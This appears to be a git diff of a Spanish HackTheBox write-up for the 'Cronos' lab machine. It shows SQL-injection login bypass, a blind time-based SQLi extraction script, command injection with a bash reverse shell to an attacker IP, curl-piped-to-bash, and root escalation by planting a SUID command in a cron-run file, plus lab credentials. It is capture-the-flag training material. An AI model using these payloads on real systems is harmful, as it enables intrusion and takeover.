@@ -1,14 +1,13 @@
 # 10.10.10.13 - Cronos
-----------------------
+![Cronos](https://user-images.githubusercontent.com/96772264/209541813-8ad744da-9a58-4408-9570-9e48ffae3ca1.png)
 
+----------------------
 # Part 1: Reconocimiento
 
 Puertos abiertos 22(ssh), 53(dns), 80(http)
-
 ```whatweb http://10.10.10.13/ # -> Apache[2.4.18]```
 
 Como está el puerto 53 abierto (DNS) se pueden hacer unas cuantas consultillas...
-
 ```console
 └─$ nslookup
 > server 10.10.10.13
@@ -22,8 +21,7 @@ Address: 10.10.10.13#53
 └─$ dig @10.10.10.13 cronos.htb axfr
 cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
 ```
-Antes de entrar en la web nos ecnargamos del reconocimiento...
-
+Antes de entrar en la web nos encargamos del reconocimiento...
 ```console
 └─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://cronos.htb/FUZZ/
 000000536:   200        16 L     58 W       925 Ch      "css"  
@@ -41,24 +39,23 @@ Antes de entrar en la web nos ecnargamos del reconocimiento...
 000009506:   302        0 L      0 W        0 Ch        "session"
 ```
 -----------------------------
-
 # Part 2: Blind SQLI
 
-La web de cronos.htb tiene muchos enlaces a sitios externos (todos relacionados con laravel) nada mas...
-Arrastra la cookie XSRF-TOKEN y laravel_session...
+La web de cronos.htb tiene muchos enlaces a sitios externos (todos relacionados con laravel) nada mas... Arrastra la cookie XSRF-TOKEN y laravel_session...  
+![cronos1](https://user-images.githubusercontent.com/96772264/209541970-f5983542-e193-4a0c-9d7b-3362b984d057.PNG)
 
-En admin.htb nos sale un panel de login. SI ponemos admin:admin nos dice "Invalid Username or Password" por lo
-que descartamos la fuerza bruta con Hydra.
+En admin.htb nos sale un panel de login. SI ponemos admin:admin nos dice "Invalid Username or Password" por lo que descartamos la fuerza bruta con Hydra!  
+[cronos2](https://user-images.githubusercontent.com/96772264/209542000-388e443f-968d-416a-9013-bd4abeb061ee.PNG)
 
-En cambio funciona la inyeccion sql más básica del mundo... ```admin' or 1=1```
-Acabamos en una sección donde el sistema ejecuta un ping, ya con eso pensamos en un OS command injection, pero
-antes vamos a exprimir la base de datos...
+En cambio funciona la inyeccion sql más básica del mundo... ```admin' or 1=1```  
+Acabamos en una sección donde el sistema ejecuta un ping, ya con eso pensamos en un OS command injection, pero antes vamos a exprimir la base de datos...  
 
 Funciona la sqli basada en tiempo -> ```admin' and sleep(5)-- -```
+
 --------------------------------------
 ## EL nombre de la base de datos actual
 
-La primera inyección sería así 
+La primera inyección sería así:
 ```
 "Si la primera letra de la base de datos actual es una "a" espera 2 segundos"
 "admin' and if(substr(database(),1,1)='a',sleep(2),1)-- -" 
@@ -96,7 +93,6 @@ Ahora toca sacar todas las bases de datos...
 ' and if(substr((select schema_name from information_schema.schemata limit 1,1),1,1)='a',sleep(2),1)-- -
 # El nuevo bucle "for i in range -> limit" itera por cada base de datos
 ```
-
 ```python
 caracteres = string.ascii_lowercase + "_"
 url = "http://admin.cronos.htb/"
@@ -116,7 +112,7 @@ for i in range(10):
 				break
 	resultado += ", "
 ```
-Las bases de datos son "information_schema" y "admin"
+Las bases de datos son "information_schema" y "admin".
 
 ---------------------
 
@@ -151,17 +147,16 @@ sqli = "' and if(substr((select group_concat(username,0x3a,password) from users 
 
 # admin' and if(substr((select group_concat(username,0x3a,password) from users limit 1,1),1,1)='a',sleep(1),1)-- -
 ```
-Las creds son: admin:4f5fffa7b2340178a716e3832451e058
-
-El problema esque ni con crackstation lo podemos romper...
-```hashid "4f5fffa7b2340178a716e3832451e058" -> MD5```
-
-Pero si en esta [web](https://www.md5online.org/md5-decrypt.html) ```1327663704```
-
----------------------
+Las creds son: admin:4f5fffa7b2340178a716e3832451e058 El problema esque ni con crackstation lo podemos romper...   
+Antes vamos a ver que tipo de hash es ```hashid "4f5fffa7b2340178a716e3832451e058" -> MD5```  
+Pero si en esta [web](https://www.md5online.org/md5-decrypt.html) ```1327663704```  
 
 
-La web nos permite hacer ping a un IP.
+-----------------------------
+# Part 3: OS Command Injection
+
+La web nos permite hacer ping a un IP.  
+![cronos4](https://user-images.githubusercontent.com/96772264/209542048-c144dd56-0506-421a-a916-82dd03ef93fa.PNG)
 
 ```
 /POST http://admin.cronos.htb/welcome.php 
@@ -186,21 +181,20 @@ Sign_Out
 11:08:20.328816 IP 10.10.14.16 > 10.10.10.13: ICMP echo reply, id 1434, seq 1, length 64
 ```
 
-Hace un comando de bash "ping" El problema cuando una web le manda un comando al sistema esque podemos jugar conç
-eso, como el navegdor está limitado, herramientas como curl permiten mas flexibilidad para meter cosas.
+Hace un comando de bash "ping" El problema cuando una web le manda un comando al sistema esque podemos jugar con eso, como el navegdor está limitado,
+herramientas como curl permiten mas flexibilidad para meter cosas.  
 
-En este caso concatenamos un segundo comando:
-```-d "command=ping -c 1; curl http://10.10.14.16&host=10.10.14.16"
-SI levantamos un servidor con el python ```sudo python3 -m http.server 80``` recibimos una petición.
+En este caso concatenamos un segundo comando: ```-d "command=ping -c 1; curl http://10.10.14.16&host=10.10.14.16"```  
+SI levantamos un servidor con el python ```sudo python3 -m http.server 80``` recibimos una petición.  
 
-```
+```console
 └─$ curl -s -X POST -H "Cookie: PHPSESSID=dq20k35860jpm19rv1jtl2j353" \
 -d "command=ping -c 1; bash -c 'bash -i >%26 /dev/tcp/10.10.14.16/443 0>%261' &host=10.10.14.16"  http://admin.cronos.htb/welcome.php | html2text
 ```
+-----------------------------
+# Part 4: En el sistema
 
-Ya con eso entramos en el sistema.
-Antes de enumerar está bien mirar por las carpetas actuales:
-
+Ya con eso entramos en el sistema. Antes de enumerar está bien mirar por las carpetas actuales:
 ```console
 www-data@cronos:/var/www/admin$ ls
 config.php  index.php  logout.php  session.php	welcome.php
@@ -216,15 +210,11 @@ www-data@cronos:/var/www/admin$ cat config.php
 www-data@cronos:/var/www/admin$ mysql -uadmin -pkEjdbRigfBHUREiNSDs
 mysql> show databases; # admin e information_schema
 ```
-Pero las bases de datos que nos salen son las que vimos con la inyección de tiempo que hicimos antes
-
-- Usarios: noulis y root (nosotros somos www-data)
-
-Podemos acceder a la user.txt de noulis 
+Pero las bases de datos que nos salen son las que vimos con la inyección de tiempo que hicimos antes:  
+- Usarios: noulis y root (nosotros somos www-data). Podemos acceder a la user.txt de noulis 
 
 Hay una tarea cron corriendo:
 ```* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1```
-
 ```console
 www-data@cronos:/tmp$ curl http://10.10.14.16/procmon.sh | bash
 > /usr/sbin/CRON -f
@@ -233,16 +223,14 @@ www-data@cronos:/tmp$ curl http://10.10.14.16/procmon.sh | bash
 < /bin/sh -c php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
 ```
 
-Root ejecuta con php el artisan este (es el script de arranque de laravel):
+Root ejecuta con php el artisan este (es el script de arranque de laravel):  
 ```console
 www-data@cronos:/var/www/admin$ cat /var/www/laravel/artisan
 <?php (...)
 www-data@cronos:/var/www/admin$ ls -l /var/www/laravel/artisan
 -rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
 ```
-Como hay permisos de escritura, se puede añadir al principio (despues de las cabeceras php) esta linea
-```system("chmod u+s /bin/bash");``` (Hacer SUID a la bash)
-
+Como hay permisos de escritura, se puede añadir al principio (despues de las cabeceras php) esta linea  ```system("chmod u+s /bin/bash");``` (Hacer SUID a la bash)
 ```console
 www-data@cronos:/var/www/admin$ bash -p
 bash-4.3# whoami
